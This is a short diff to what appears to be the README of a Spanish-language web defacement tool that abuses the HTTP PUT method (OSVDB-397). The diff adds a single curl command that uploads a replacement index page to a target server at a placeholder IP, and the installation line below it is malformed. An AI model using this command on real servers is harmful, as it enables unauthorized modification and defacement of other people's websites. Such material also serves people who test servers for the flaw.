@@ -1,5 +1,7 @@
 # Defacement WEB suite por HTTP Method PUT OPTIONS POST OSVDB-397
 
+curl -k -X PUT -T "/tmp/index2.htm" "https://IP/index2.htm" -vv
+
 # Instalación:
 
 apt-get install #https://github.com/hackingyseguridad/webdeface
